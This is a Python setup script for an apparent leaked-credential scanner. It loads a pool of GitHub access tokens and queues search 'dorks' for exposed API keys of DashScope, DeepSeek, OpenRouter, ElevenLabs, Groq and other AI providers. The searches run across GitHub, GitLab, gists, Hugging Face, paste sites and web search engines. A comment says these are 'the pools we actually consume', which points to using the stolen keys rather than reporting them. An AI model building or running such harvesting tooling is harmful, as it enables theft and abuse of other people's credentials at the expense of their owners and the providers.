#!/usr/bin/env python3
"""Seed settings + GitHub PAT pool into the scanner DB once the schema exists.

Render free has an ephemeral disk: every deploy starts from an empty database,
so the operator PAT pool and card settings must be re-applied on boot.
Reads: DB_PATH, GH_PATS_B64 (base64 of whitespace-separated tokens), AUTO_CARDS.
"""
import base64
import os
import sqlite3
import sys
import time


# Provider dorks: DashScope first, then the pools we actually consume.
# A handful of high-signal queries per repo host beats 20 generic sources.
PROVIDER_DORKS = [
    ('"dashscope.aliyuncs.com" "sk-"', 900),
    ('"dashscope-intl.aliyuncs.com" "sk-"', 890),
    ('"DASHSCOPE_API_KEY"', 880),
    ('"compatible-mode/v1" "sk-"', 870),
    ('"qwen3" "sk-" filename:.env', 860),
    ('"xi-api-key" filename:.env', 850),
    ('"ELEVENLABS_API_KEY"', 840),
    ('"api.deepseek.com" "sk-"', 830),
    ('"api.siliconflow.cn" "sk-"', 820),
    ('"generativelanguage.googleapis.com" "AIza"', 810),
    ('"openrouter.ai" "sk-or-v1-', 800),
    ('"api.together.xyz" "sk-"', 790),
    ('"api.groq.com" "gsk_"', 780),
    ('"integrate.api.nvidia.com" "nvapi-"', 770),
    ('"api.moonshot" "sk-"', 760),
    ('"api.z.ai" "sk-"', 750),
]

SOURCE_LANES = [
    ("github", 0),
    ("gitlab", -30),
    ("gist", -60),
    ("hf", -90),
    ("pastegg", -120),
    ("bing", -150),
    ("ddg", -180),
]


def seed_dorks(con, node_idx, node_n):
    """Provider-focused search queue, sharded across nodes."""
    tasks = []
    for query, weight in PROVIDER_DORKS:
        for lane, pen in SOURCE_LANES:
            tasks.append((lane, query, weight + pen))
    added = 0
    for i, (lane, query, prio) in enumerate(tasks):
        if i % node_n != node_idx:
            continue
        cur = con.execute(
            "INSERT OR IGNORE INTO source_tasks(source,query,priority,enabled) VALUES(?,?,?,1)",
            (lane, query, prio))
        added += cur.rowcount
        if cur.rowcount == 0:
            con.execute(
                "UPDATE source_tasks SET priority=?, enabled=1 WHERE source=? AND query=?",
                (prio, lane, query))
    active = con.execute("select count(*) from source_tasks where enabled=1").fetchone()[0]
    return added, active


def main() -> int:
    db = os.environ.get("DB_PATH", "/app/data/scanner.db")
    pats_b64 = os.environ.get("GH_PATS_B64", "")
    auto_cards = os.environ.get("AUTO_CARDS", "1")
    auto_batch = os.environ.get("AUTO_BATCH", "4")
    node_idx = int(os.environ.get("NODE_IDX", "0") or 0)
    node_n = max(int(os.environ.get("NODE_N", "1") or 1), 1)

    deadline = time.time() + 180
    while time.time() < deadline:
        time.sleep(5)
        try:
            con = sqlite3.connect(db, timeout=10)
            con.execute("select 1 from pats limit 1")
        except Exception:
            continue
        try:
            for k, v in (("auto_cards", auto_cards), ("auto", "1"),
                         ("auto_batch", auto_batch),
                         ("notify_limit", os.environ.get("NOTIFY_LIMIT", "0")),
                         ("checker_models", os.environ.get("CHECKER_MODELS", "10"))):
                con.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)", (k, v))
            offered = 0
            if pats_b64:
                raw = base64.b64decode(pats_b64).decode("utf-8", "ignore")
                for t in raw.split():
                    t = t.strip()
                    if not t.startswith(("ghp_", "github_pat_")):
                        continue
                    con.execute(
                        "INSERT OR IGNORE INTO pats(token,provider,status,search_lane,added_at) "
                        "VALUES(?,?,?,?,strftime('%s','now'))",
                        (t, "github", "alive", "pat"),
                    )
                    offered += 1
            con.commit()
            alive = con.execute("select count(*) from pats where status='alive'").fetchone()[0]
            added, active = seed_dorks(con, node_idx, node_n)
            con.commit()
            print("[seed] auto_cards=%s pats=%d alive=%d | dorks added=%d active=%d (node %d/%d)"
                  % (auto_cards, offered, alive, added, active, node_idx + 1, node_n), flush=True)
            return 0
        except Exception as exc:
            print("[seed] retry:", repr(exc)[:120], flush=True)
            time.sleep(5)
    print("[seed] gave up: schema never appeared", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())